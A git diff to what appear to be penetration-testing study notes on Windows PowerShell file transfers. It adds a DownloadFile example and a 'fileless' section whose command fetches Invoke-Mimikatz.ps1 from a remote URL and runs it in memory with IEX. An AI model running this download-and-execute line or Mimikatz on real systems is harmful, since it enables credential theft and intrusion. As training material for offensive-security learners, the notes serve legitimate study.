@@ -2,7 +2,7 @@
 [PowerShell Base64 Encode & Decode](https://github.com/h4ck3r-cat/file.transfers/edit/main/Windows.md#powershell-base64-encode--decode)
 [PowerShell Web Downloads](https://github.com/h4ck3r-cat/file.transfers/edit/main/Windows.md#powershell-base64-encode--decode)
 ## PowerShell Base64 Encode & Decode
-- This method does **not** require a network connection</li>
+This is the simplest and most conveinient method and does **not** require a network connection
 
 ### Step 1: Check MD5 Hash
 ```bash
@@ -45,5 +45,17 @@ PowerShell provides a versatile array of **file transfer** capabilities, with th
 | DownloadDataAsync   | Asynchronously downloads data from a resource, returning a Byte array without blocking the calling thread.|
 | [DownloadFile]()        | Downloads data from a resource and saves it to a local file.                                             |
 | DownloadFileAsync   | Asynchronously downloads data from a resource to a local file without blocking the calling thread.       |
-| DownloadString      | Retrieves a String from a resource and returns it as a String.                                            |
+| [DownloadString]()      | Retrieves a String from a resource and returns it as a String.                                            |
 | DownloadStringAsync | Asynchronously downloads a String from a resource without blocking the calling thread.                    |
+
+### PowerShell DownloadFile Method
+You can download files using the following powershell code:
+```powershell
+PS> (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
+```
+
+### PowerShell DownloadString - Fileless Method
+Fileless attacks operate by utilizing certain functions within an operating system to download and execute a payload directly. Instead of saving a PowerShell script to the computer's storage, we execute it straight from the computer's memory using the Invoke-Expression cmdlet or its shorthand alias, IEX as follows:
+```powershell
+PS> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+```
